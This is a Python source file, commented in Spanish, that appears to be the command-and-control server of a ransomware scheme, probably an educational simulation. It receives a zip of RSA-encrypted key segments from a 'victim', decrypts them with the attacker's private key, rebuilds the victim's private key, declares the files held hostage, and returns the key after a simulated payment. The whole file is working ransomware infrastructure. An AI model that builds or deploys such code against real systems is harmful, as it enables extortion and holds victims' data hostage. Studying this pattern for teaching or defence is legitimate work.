import socket
import zipfile
import os
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def _recibir_exacto(sock, n):
    datos = b''
    while len(datos) < n:
        chunk = sock.recv(n - len(datos))
        if not chunk:
            raise ConnectionError("Conexión cerrada")
        datos += chunk
    return datos


def enviar_bytes(sock, data: bytes):
    longitud = len(data).to_bytes(4, 'big')
    sock.sendall(longitud + data)


def recibir_bytes(sock) -> bytes:
    longitud = int.from_bytes(_recibir_exacto(sock, 4), 'big')
    return _recibir_exacto(sock, longitud)


def cargar_privada_permanente(ruta):
    """
    Carga la llave privada del atacante para descifrar lo que mande la víctima.
    """
    with open(ruta, 'rb') as f:
        return serialization.load_pem_private_key(f.read(),
	       password=None, backend=default_backend())

def procesar_zip_y_descifrar(nombre_zip, privada_perm):
    """
    Abre el zip, descifra cada segmento en el orden correcto
    y recostruye la llave privada local de la víctima
    """
    llave_privada_local_bytes = b""
    with zipfile.ZipFile(nombre_zip, 'r') as af:
        num_segmentos = len(af.namelist())
        for i in range(num_segmentos):
            nombre = f"seg{i}.bin"

            if nombre in af.namelist():
                segmento_cifrado = af.read(nombre)
                #print(f"{nombre}: {len(segmento_cifrado)} bytes")

                segmento_claro = privada_perm.decrypt(
                    segmento_cifrado,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                llave_privada_local_bytes += segmento_claro
    return llave_privada_local_bytes

def crear_socket_servidor(puerto):
    privada_perm = cargar_privada_permanente("llave_privada_permanente.pem")

    pub = privada_perm.public_key()
    pem = pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    #print(pem.decode())
    
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind(('', int(puerto)))
    servidor.listen(1)

    print(f"Servidor CC esperando en el puerto {puerto}...")
    cliente_soc, addr = servidor.accept()
    print(f"Conexión establecida con la víctima: {addr}")

    try:
        print("Recibiendo paquete de llaves cifradas (.zip)...")
        zip_recibido = recibir_bytes(cliente_soc)

        nombre_zip_temp = "paquete_recibido.zip"
        with open(nombre_zip_temp, 'wb') as f:
            f.write(zip_recibido)

        llave_victima_pem = procesar_zip_y_descifrar(nombre_zip_temp, privada_perm)
        print("[OK] Llave privada local reconstruida y lista.")

        print("\n\n\n")
        print("SITUACIÓN: Archivos secuentrados.")
        input("Presiona Enter para simular el PAGO y liberar la llave...")

        enviar_bytes(cliente_soc, llave_victima_pem)
        print("[OK] Llave de liberación envíada. Ataque finalizado.")

        os.remove(nombre_zip_temp)
    except Exception as e:
        print(f"[!] Error en el servidor: {e}")
    finally:
        cliente_soc.close()
        servidor.close()


if __name__ == "__main__":
    all_args = argparse.ArgumentParser()
    all_args.add_argument("-p", "--puerto", help="Puerto del servidor CC", required=True)
    args = all_args.parse_args()

    crear_socket_servidor(args.puerto)
